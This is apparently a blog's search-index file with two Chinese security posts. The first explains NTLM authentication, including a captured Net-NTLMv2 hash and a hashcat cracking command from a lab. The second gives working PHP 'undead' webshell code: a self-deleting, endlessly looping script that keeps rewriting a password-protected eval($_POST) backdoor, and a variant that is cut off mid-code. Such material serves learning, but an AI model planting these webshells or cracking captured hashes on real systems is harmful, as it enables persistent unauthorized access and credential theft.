<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>NTLM和NTLM身份的认证</title>
      <link href="/posts/7c3c.html"/>
      <url>/posts/7c3c.html</url>
      
        <content type="html"><![CDATA[<h1 id="NTLM和NTLM身份的认证"><a href="#NTLM和NTLM身份的认证" class="headerlink" title="NTLM和NTLM身份的认证"></a>NTLM和NTLM身份的认证</h1><p>前言：博客的所有文章只是自己学习的过程，参考各大佬的文章来学习，还有自己的理解，知识点比较浅，见谅。</p><p>耽搁了好久，9月23号写到一半，然后就忙事去了，结果拖到现在，赶紧补回来。</p><p>学习之前简单了解几个概念</p><h2 id="SSPI-和-SSP了解"><a href="#SSPI-和-SSP了解" class="headerlink" title="SSPI 和 SSP了解"></a>SSPI 和 SSP了解</h2><h3 id="SSPI"><a href="#SSPI" class="headerlink" title="SSPI"></a>SSPI</h3><p>SSPI（Security Support Provider Interface），即 <strong>安全服务提供接口</strong>，这是 Windows 定义的一套接口，该接口定义了与安全有关的功能函数，包含但不限于：</p><ul><li>身份验证机制</li><li>信息完整性</li><li>为其他协议提供的会话安全机制</li></ul><p>此接口定义了与安全有关的功能函数， 用来获得<strong>验证、信息完整性、信息隐私</strong>等安全功能，就是定义了一套接口函数用来身份验证，签名等，但是没有具体的实现。</p><h3 id="ssp"><a href="#ssp" class="headerlink" title="ssp"></a>ssp</h3><p>SSP（Security Service Provider），即 <strong>安全服务提供</strong>，他是 SSPI 的实现者，是对 SSPI 相关功能函数的具体实现。微软自己实现了如下的 SSP，用于提供安全功能：</p><ol><li>NTLM SSP</li><li>Kerberos</li><li>Cred SSP</li><li>Digest SSP</li><li>Negotiate SSP</li><li>Schannel SSP</li><li>Negotiate Extensions SSP</li><li>PKU2U SSP</li></ol><p>怎么来理解这两个，SSPI因为被叫做安全服务接口，它只是定义了函数（这些函数的功能是什么），但是他没有办法去实现自己定义的函数，那么SSP就出现了，就可以实现SSPI定义的函数，来实现功能。</p><p>因为 SSPI 中定义了与 Session Security 有关的 API。所以，基本上层应用利用任何 SSP 与远程的服务进行了身份验证后，此 SSP 都会为本次连接生成一个随机 key。这个 key 往往被称为 Session Key。上层应用在经过身份验证后，可以选择性地使用这个 Key 对之后发往服务端或接收自服务端的数据进行签名或加密。</p><blockquote><p><strong>就打比方来说kerberos协议里面就有一个session key  ，这么来理解就是利用了SSP与远程服务进行身份验证后就会生成一个key值，这个key就可以对服务端或者接受服务端的数据都可以进行签名或加密。而kerberos里面的就是利用了hash值来对session key进行加密</strong></p></blockquote><p>在系统层面，SSP就是一个dll（window里面动态链接库，linux是.so），来实现身份验证等安全功能，实现的身份验证机制是不一样的。比如 NTLM SSP 实现的就是一种 Challenge/Response 验证（挑战/应答）机制。而 Kerberos 实现的就是基于 ticket 的身份验证机制。我们可以编写自己的 SSP，然后注册到操作系统中，让操作系统支持更多的自定义的身份验证方法。</p><p>那么既然我们可以自己创建一个ssp，注册到操作系统中，那么就能想到权限的维持，或者说是后门：<strong>Security Support Provider</strong></p><p>这就是windows定义的的一套接口  </p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/402d2ba6f20ae11de236969a5e8dde36.gif" alt="img"></p><p>RPC:远程过程调用(RPC)是一种通过网络从远程计算机程序上请求服务,而不需要了解底层网络技术的协议</p><h2 id="windows的认证方式"><a href="#windows的认证方式" class="headerlink" title="windows的认证方式"></a>windows的认证方式</h2><p>学习之前，不去研究下面的，先来回顾一下什么是认证？</p><p>顾名思义就是去证明你自己，拿个简单的例子就是一个服务器，当它存在401认证的时候，你的要有权限去访问，你虽然是管理员，但是你没有去证明自己是真的管理员，那么我们又如何去证明？</p><p>因为存在着401认证，而我们的账号密码都存放在了数据库里面，当我们输入账号密码进去的时候，就会去数据库里面寻找是否有该账号和密码，如果存在那么成功登录，不存在，登录就失败。这就是最简单的windows的basic认证，简单暴力直接，但是安全问题就比较大了。</p><p>这时候呢就存在了一个加密的传输，就举个简单的例子，在我们不知道密码的情况下，是如何判断身份的呢，或者说是间接的知道了密码：就你跟你的好朋友一起，同时旁边还有第三者，你跟你朋友之间谈话是明文，第三者确实能听懂，但是不用说出密码你们两个就能判别互相的身份，关键第三者不知道你们两之间的密码。而两者之间如何身份相互认证之后，那么他们之间的会话传递就是加密的。</p><p>而windows里面最常见的就是kerberos协议和NTLM协议，附上大佬的图，基本的认证方式</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014164343148.png" alt="image-20211014164343148"></p><h3 id="windows的本地认证"><a href="#windows的本地认证" class="headerlink" title="windows的本地认证"></a>windows的本地认证</h3><p>简单了解完了windows的认证方式，再来看看windows的本地认证。</p><p>本地认证的密码都存储在%SystemRoot%\System32\config\SAM里面。当用户输入密码的时候，就会将输入的密码进行NTLM hash加密，然后在sam里面找有没有相匹配的。当用户注销，重启，锁屏之后，就会到登录界面，而winlogon接收到用户的输入后，就会把密码交给lsass进程，这个进程会存一份明文密码，然后再将明文密码加密成NTLM hash，跟sam里面的比对</p><p>(winlogon.exe即Windows Logon Process，是Windows NT用户登陆程序，用于管理用户登录和退出。lsass进程用于微软Windows系统的安全机制。它用于本地安全和登陆策略。)</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014165131825.png" alt="image-20211014165131825"></p><h4 id="LM-Hash-amp-NTLM-Hash"><a href="#LM-Hash-amp-NTLM-Hash" class="headerlink" title="LM Hash &amp; NTLM Hash"></a>LM Hash &amp; NTLM Hash</h4><p>在wwindows内部中，并不是直接保存明文密码，而是保存hash的</p><p>本机密码保存地：%SystemRoot%\System32\config\SAM</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014113151714.png" alt="image-20211014113151714"></p><p>域用户密码保存地：%SystemRoot%/NTDS/ntds.dit</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014113230305.png" alt="image-20211014113230305"></p><p>%SystemRoot%的理解</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014113256436.png" alt="image-20211014113256436"></p><p>而一般windows里面导出来的hash是这样的</p><pre><code>Administrator:500:aad3b435b51404eeaad3b435b51404ee:afffeba176210fad4628f0524bfe1942:::其中前面是LM hash  后面是NT hashadministrator:500:LM hash:NTLM hash:::</code></pre><p>在windows2000以后的系统中，第一部分的 LM-hash 都是空值，因为LM-hash可以很容易的破解，所以windows2000之后这个值默认为空，所以第二部分的NTLM-hash才真正是用户密码的哈希值</p><h5 id="LM-hash"><a href="#LM-hash" class="headerlink" title="LM hash"></a><strong>LM hash</strong></h5><p>LM Hash 的全称为 LAN Manager Hash，这是 Windows 中最早用的加密算法。</p><p>LM hash的计算方式</p><pre class="line-numbers language-php"><code class="language-php"><span class="token number">1</span><span class="token punctuation">.</span>首先将密码转换成大写，然后再十六进制转换，明文口令不足<span class="token number">14</span>字节的情况下，后面添加<span class="token number">0</span>补足<span class="token number">14</span>字节（一个字节＝<span class="token number">2</span>个<span class="token number">16</span>进制字符，一个<span class="token number">16</span>进制位＝<span class="token number">0.5</span>个字节）<span class="token constant">WELCOME</span><span class="token operator">--</span>》<span class="token constant">57454C434F4D45</span> <span class="token number">00000000000000</span>  所以这里是十六进制是<span class="token number">7</span>个字节，加上后面的<span class="token number">0</span>就是<span class="token number">14</span>字节<span class="token number">2</span><span class="token punctuation">.</span>密码的<span class="token number">16</span>进制字符串被分成两个<span class="token number">7</span>字节部分。将<span class="token number">7</span>字节转换成7bit，每7bit后面添<span class="token number">0</span>补足<span class="token number">8</span>位<span class="token constant">57454C434F4D45</span> <span class="token operator">-</span><span class="token function">str_to_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span> <span class="token constant">56A25288347A348A</span><span class="token number">00000000000000</span> <span class="token operator">-</span><span class="token function">str_to_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span> <span class="token number">0000000000000000</span><span class="token number">3</span><span class="token punctuation">.</span>这两组<span class="token number">8</span>字节数据将做为<span class="token constant">DESKEY</span>对魔术字符串”<span class="token constant">KGS</span><span class="token operator">!</span>@<span class="token shell-comment comment">#$%”进行标准DES加密</span><span class="token string">"KGS!@#$%"</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token constant">4B47532140232425</span><span class="token constant">56A25288347A348A</span> <span class="token operator">-</span>对<span class="token constant">4B47532140232425</span>进行标准<span class="token constant">DES</span>加密<span class="token operator">-</span><span class="token operator">></span> <span class="token constant">C23413A8A1E7665F</span><span class="token number">0000000000000000</span> <span class="token operator">-</span>对<span class="token constant">4B47532140232425</span>进行标准<span class="token constant">DES</span>加密<span class="token operator">-</span><span class="token operator">></span> <span class="token constant">AAD3B435B51404EE</span><span class="token number">4</span><span class="token punctuation">.</span>最后两个拼接<span class="token constant">LM</span> Hash<span class="token punctuation">:</span> <span class="token constant">C23413A8A1E7665FAAD3B435B51404EE</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>缺点</strong></p><p>1.密码长度最大只能位14位数</p><p>2.密码不区分大小写。在生成哈希值之前，所有密码都将转换为大写</p><p>3.查看我们的加密过程，就可以看到使用的是分组的DES，如果密码强度是小于7位，那么第二个分组加密后的结果肯定是aad3b435b51404ee，如果我们看到LM hash的结尾是aad3b435b51404ee，就可以很轻易的发现密码强度少于7位</p><p>4.DES密码强度不高</p><h5 id="NTLM-hash"><a href="#NTLM-hash" class="headerlink" title="NTLM hash"></a>NTLM hash</h5><p>从Windows Vista 和 Windows Server 2008开始，默认情况下只存储 NTLM Hash，LM Hash 将不再存在</p><p>下面是各个版本对LM NTLM的支持</p><table><thead><tr><th></th><th>2000</th><th>XP</th><th>2003</th><th>Vista</th><th>Win7</th><th>2008</th><th>Win8</th><th>2012</th></tr></thead><tbody><tr><td>LM</td><td>√</td><td>√</td><td>√</td><td></td><td></td><td></td><td></td><td></td></tr><tr><td>NTLM</td><td>⭐</td><td>⭐</td><td>⭐</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr></tbody></table><p>其中</p><p>√：系统默认的使用的加密方式</p><p>⭐：当密码超过14位后使用的加密方式</p><p>当我们抓取密码的时候，如果LM是空或者不储蓄LM hash的话，那么我们的hashdump抓取的 LM hash那一部分都是 下面这个</p><pre><code>AAD3B435B51404EEAAD3B435B51404EE</code></pre><p>拿一个打靶机hashdump读出来的</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014163639393.png" alt="image-20211014163639393"></p><p>可以看到所有的LM hash密码一致</p><p>也可以</p><pre><code>可以将LM hash填0(LM hash可以为任意值)，即00000000000000000000000000000000:NT hash //注意32个0</code></pre><p>扯回NTLM hash</p><p><strong><u>NTLM hash的计算方法</u></strong></p><pre><code>1.先将用户密码转换为十六进制格式。2.将十六进制格式的密码进行Unicode编码。3.使用MD4摘要算法对Unicode编码数据进行Hash计算</code></pre><p>脚本验证</p><pre class="line-numbers language-python"><code class="language-python">python2 <span class="token operator">-</span>c <span class="token string">'import hashlib,binascii; print binascii.hexlify(hashlib.new("md4", "woshidatiancai".encode("utf-16le")).digest())'</span>  <span class="token operator">//</span>密码woshidatiancai<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014163854409.png" alt="image-20211014163854409"></p><p>可以看到加密后的NTLM hash值</p><h3 id="NTLM的身份认证"><a href="#NTLM的身份认证" class="headerlink" title="NTLM的身份认证"></a>NTLM的身份认证</h3><p>NTLM的认证可分为本地认证和网络认证，本地认证就是windows的本地认证，而网络认证就是用于域的基础认证，或者工作组的认证</p><h4 id="NTLM协议"><a href="#NTLM协议" class="headerlink" title="NTLM协议"></a>NTLM协议</h4><p>NTLM是一种网络认证协议，它是基于挑战（Chalenge）/响应（Response）认证机制的一种认证模式。(这个协议只支持Windows)</p><p>NTLM协议的认证（也就是NTLM认证）共需要三个消息完成：协商 –&gt; 挑战 –&gt; 认证。</p><blockquote><p>type1（协商）：主要用于确认双方协议版本、加密等级等</p><p>type2（挑战）：服务器在收到客户端的协商消息之后， 会读取其中的内容，并从中选择出自己所能接受的服务内容，加密等级，安全服务等等。并生成一个随机数challenge, 然后生成challenge消息返回给客户端。该消息就是挑战/响应认证机制的主要功能体现。</p><p>type3（认证）：验证主要是在挑战完成后，验证结果，是认证的最后一步。</p></blockquote><h4 id="NTLM在工作组当中的认证方式"><a href="#NTLM在工作组当中的认证方式" class="headerlink" title="NTLM在工作组当中的认证方式"></a>NTLM在工作组当中的认证方式</h4><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014220249473.png" alt="image-20211014220249473"></p><p>1.当用户的登录客户端后需要访问服务器的某个服务的时候就需要输入想相对应的密码，于是用户在客户端输入了服务器的账号密码之后，客户端就会去缓存一个自己输的服务器密码的NTLM-hash值，同时也会发送type1协商需要认证的主体，服务器的用户，安全服务等等。服务器那门当然是提前存储了正确的账号密码</p><p>2.服务端接受到了客户端的type1协商之后，就会去打开里面的内容，识别一些它能识别的内容：服务内容，加密等级，安全服务等。然后传入到NTLM SSP中去，就会得到type 2 challenge（challenge挑战消息），并将此type2（没有加密过的challenge）发送给客户端，里面就包含了服务器生成的challenge16位随机值</p><p>3.客户端收到服务端返回的 TYPE 2 消息后， 会读取出服务端所支持的内容，并取出其中的随机值 Challenge，用缓存登录的密码的 NTLM-Hash 对其进行加密，其实就得到了challenge2（也可以说是response），并与用户名、主机名、Challenge 等一起组合得到 <strong>Net-NTLMHash</strong>，最后将 <strong>Net NTLM-Hash</strong> 封装到 <strong>TYPE 3 Authenticate</strong> 消息中（被称为 Authenticate 认证消息），发往服务端</p><p>4.服务器在收到 TYPE 3 的消息之后，用自己之前存储的 NTLM-Hash 对 Challenge 进行加密，得到一个challenge1，并比较自己计算出的 Net  NTLM-Hash 认证消息和客户端发送的认证消息是否匹配（也就是challenge1比较response）。如果匹配，则证明客户端掌握了正确的密码，认证成功，否则认证失败。</p><p>总的来说就是：当客户端输入用户名和密码之后，就会缓存自己输入密码的NTLM hash，并发送type1 ，服务器收到并打开，传入NTLM SSP中去，就会得到服务器随机生成的16位，发送给客户端的同时也保存。客户端接受并取出随机值，再用缓存的NTLM hash进行加密得到net-NTLMhash，再发送给服务器，最后就是服务收到后用自己的密码的NTLM hash对保存的challenge加密在进行比较</p><p>所以就是客户端输入的缓存密码NTLM hash加密challenge  对比  服务器的自己正确的密码的NTLM hash对自己本身生成的保存的challenge </p><h4 id="抓包查看"><a href="#抓包查看" class="headerlink" title="抓包查看"></a>抓包查看</h4><p>实验靶机 win7   2008</p><p>win7 : 192.168.1.129</p><p>2008: 192.168.1.131</p><p>前提可以ipc连接</p><p>通过抓包来看看具体的历程</p><p>认证失败的</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014233938924.png" alt="image-20211014233938924"></p><p>通过抓包</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014234000457.png" alt="image-20211014234000457"></p><p>四个数据包对应NTLM认证的四个步骤，查看第二个数据包</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014234103218.png" alt="image-20211014234103218"></p><p>可以看到challenge，再看第三个数据包</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014235107219.png" alt="image-20211014235107219"></p><p>可以看到第三个数据包就有response了</p><p>再来看看认证成功的</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015102615653.png" alt="image-20211015102615653"></p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014234704224.png" alt="image-20211014234704224"></p><p>同样看看第二个数据包可以看到challenge</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014234731583.png" alt="image-20211014234731583"></p><p>再来看看第三个</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211014235043263.png" alt="image-20211014235043263"></p><p>我们可以看到一个NTLMv2的格式</p><p>其实NTLM 有3个版本  分为NTLM v1，NTLMv2，NTLM session v2</p><p>不同协议使用不同格式的Challenge和加密算法</p><p>所以也就存在不同协议的Net-NTLM hash，即Net-NTLM v1 hash，Net-NTLM v2 hash  而上面抓的包中response里面就是Net-NTLM hash</p><h4 id="NTLMv1和NTLMv2的区别"><a href="#NTLMv1和NTLMv2的区别" class="headerlink" title="NTLMv1和NTLMv2的区别"></a>NTLMv1和NTLMv2的区别</h4><p>不同的是challenge和加密算法，但是相同的是都是用了NTLM hash</p><p>v1的challenge：8字节    算法：DES</p><p>v2的challenge：16字节   算法：HMAC-MD5</p><p>NTLMv1的格式</p><pre><code>username::hostname:LM response:NTLM response:challenge</code></pre><p>NTLMv2的格式</p><pre><code>username::domain:challenge:HMAC-MD5:blob</code></pre><p>这里主要看NTLMv2</p><p>username：就是要访问的服务器名</p><p>domain：访问的主机名或者ip</p><p>challenge：数据包中2所返回的challenge</p><p>HMAC-MD5：对应数据包3中的NTProofStr</p><p>blob：对应数据包中Response去掉NTProofStr的那一部分</p><p>比如：</p><p>f6ef4594fbb2c9387335b27e592c5f1f01010000000000002d38cda912c1d701042c7990deeb4736000000000200060047004f004400010006004f005700410004000e0067006f0064002e006f0072006700030016006f00770061002e0067006f0064002e006f007200670005000e0067006f0064002e006f0072006700070008002d38cda912c1d701060004000200000008003000300000000000000000000000003000009f57401aa3d5a32acac00d0ce543bd9d606d0156b648aede2f1378737b9e1cd90a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e00310033003100000000000000000000000000</p><p>而NTProofStr是f6ef4594fbb2c9387335b27e592c5f1f</p><p>那么就去掉response中前面的NTProofStr</p><p>最后就是</p><p>01010000000000002d38cda912c1d701042c7990deeb4736000000000200060047004f004400010006004f005700410004000e0067006f0064002e006f0072006700030016006f00770061002e0067006f0064002e006f007200670005000e0067006f0064002e006f0072006700070008002d38cda912c1d701060004000200000008003000300000000000000000000000003000009f57401aa3d5a32acac00d0ce543bd9d606d0156b648aede2f1378737b9e1cd90a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e00310033003100000000000000000000000000</p><p>总：</p><pre><code>administrator::192.168.1.131:ed71177f930bd7ad:f6ef4594fbb2c9387335b27e592c5f1f:01010000000000002d38cda912c1d701042c7990deeb4736000000000200060047004f004400010006004f005700410004000e0067006f0064002e006f0072006700030016006f00770061002e0067006f0064002e006f007200670005000e0067006f0064002e006f0072006700070008002d38cda912c1d701060004000200000008003000300000000000000000000000003000009f57401aa3d5a32acac00d0ce543bd9d606d0156b648aede2f1378737b9e1cd90a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e00310033003100000000000000000000000000</code></pre><p>有了NET-NTLM hash之后我们就可以进行爆破了</p><pre><code>hashcat -m 5600 administrator::GOD:ed71177f930bd7ad:f6ef4594fbb2c9387335b27e592c5f1f:01010000000000002d38cda912c1d701042c7990deeb4736000000000200060047004f004400010006004f005700410004000e0067006f0064002e006f0072006700030016006f00770061002e0067006f0064002e006f007200670005000e0067006f0064002e006f0072006700070008002d38cda912c1d701060004000200000008003000300000000000000000000000003000009f57401aa3d5a32acac00d0ce543bd9d606d0156b648aede2f1378737b9e1cd90a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e00310033003100000000000000000000000000 3.txt --force</code></pre><p>-m： hash-type，5600对应NetNTLMv2，详细参数可查表：<a href="https://hashcat.net/wiki/doku.php" target="_blank" rel="noopener">https://hashcat.net/wiki/doku.php</a></p><p>3000是LM hash  NTLM hash是1000</p><p>–force代表强制执行，测试系统不支持Intel OpenCL</p><p>如果想输出文件可以 -o </p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015133309702.png" alt="image-20211015133309702"></p><p>可以看到密码已经爆破出来。</p><h4 id="NTLM在域环境中的认证"><a href="#NTLM在域环境中的认证" class="headerlink" title="NTLM在域环境中的认证"></a>NTLM在域环境中的认证</h4><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211015143559447.png" alt="image-20211015143559447"></p><p>前面3个步骤跟NTLM 在工作组的认证一样，主要是4，5，6</p><p>4.服务器收到了客户端发送的type3认证消息后，取出其中的Net NTLM-hash的值，并通过Netlogon协议向DC域控发送针对客户端的验证请求。该请求主要包含以下三方面的内容：客户端用户名、原始的Challenge 和 加密后的Challenge(也就是Net NTLM-Hash）</p><p>5.然后DC就会拿出自己的存储的NTLM hash对challenge加密得到Net NTLM-hash，并且跟服务器所发的进行对比，，如果一致，则用户拥有正确的密码，验证通过，否则验证失败。并将验证结果发给服务器。</p><p>6.然后服务器根据DC发送的结果，并给客户端回答</p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 内网渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不死马php</title>
      <link href="/posts/41ff.html"/>
      <url>/posts/41ff.html</url>
      
        <content type="html"><![CDATA[<h1 id="不死php-webshell"><a href="#不死php-webshell" class="headerlink" title="不死php webshell"></a>不死php webshell</h1><h2 id="什么是不死马"><a href="#什么是不死马" class="headerlink" title="什么是不死马"></a>什么是不死马</h2><p>何为不死马，简而言之杀不死的🐎，就是运行一段不会退出进程（注入php进程里面的，也称PHP的内存马）的木马，并且是无限执行的。主要作用就是去维持权限。</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/%E9%A9%AC%E9%BA%A6%E7%9A%AE.jpg" alt="马麦皮"></p><p>在实战当中，虽然很少去利用，但是有的时候也可以<strong>有效的去用来做一些防护的绕过</strong>。也加大了一些<strong>溯源的难度，和宿主检测webshell的难度</strong></p><h2 id="生成的过程"><a href="#生成的过程" class="headerlink" title="生成的过程"></a>生成的过程</h2><p>1.首先创建一个不死马.php</p><p>2.上传服务器</p><p>3.执行不死马</p><p>4.服务器无限生成</p><h2 id="例一"><a href="#例一" class="headerlink" title="例一"></a>例一</h2><p>先来看一个简单的例子</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"ash.php"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//打开一个文件</span><span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token string">"&lt;?php phpinfo();?>\n"</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">//写入一个文件</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>当我们去访问，就就会在本地生成一个ash.php</p><p><img src="/images/loading.gif" data-original="https://ashupup.oss-cn-beijing.aliyuncs.com/img/image-20211012231423263.png" alt="image-20211012231423263"></p><p>缺点就是每次去访问才会生成,  看别人写的循环，我访问了直接卡死了</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">do</span> <span class="token punctuation">{</span>  <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">'test.php'</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"xxx"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"test.php"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token string">"&lt;?php phpinfo();?>\n"</span><span class="token punctuation">;</span>  <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="例二"><a href="#例二" class="headerlink" title="例二"></a>例二</h2><p>上面例一只是一个小例子，再来看看一个经典的不死马</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string">' ash.php'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//文件名为ash.php</span>    <span class="token variable">$code</span> <span class="token operator">=</span> <span class="token string">'&lt;?php if(md5($_GET["ash"])=="e10adc3949ba59abbe56e057f20f883e"){@eval($_POST["ash"]);}?>'</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//123456</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token variable">$code</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">usleep</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>来看第一个 </p><p>ignore_user_abort(true);  //设置与远程客户端断开后是否继续执行脚本，true即不断开，意思就是即使与客户端断开（不打开浏览器）也可以执行脚本的</p><p>set_time_limit(0) // 函数设置脚本最大执行时间。这里设置为 0，即没有时间方面的限制。</p><p>@unlink(<strong>FILE</strong>);  //删除文件本身 ,做到隐藏的功能，也就是无文件落地实现</p><p>file_get_contents($file,$code);  //打开$file文件，然后写入$code </p><p>usleep(5000);  //每隔usleep(5000)写入一个新文件</p><p>还可以变形成这样（大佬的文章写的这个方法，感觉挺好用的，就搬过来）</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>  <span class="token function">ignore_user_abort</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//关掉浏览器，PHP脚本也可以继续执行.</span>  <span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//通过set_time_limit(0)可以让程序无限制的执行下去</span>  <span class="token variable">$interval</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// 每隔*秒运行</span><span class="token keyword">do</span> <span class="token punctuation">{</span>  <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token string">'test.php'</span><span class="token punctuation">;</span>  <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">echo</span> <span class="token string">"xxx"</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span>  <span class="token keyword">else</span> <span class="token punctuation">{</span>    <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"test.php"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token string">"&lt;?php phpinfo();?>\n"</span><span class="token punctuation">;</span>  <span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token 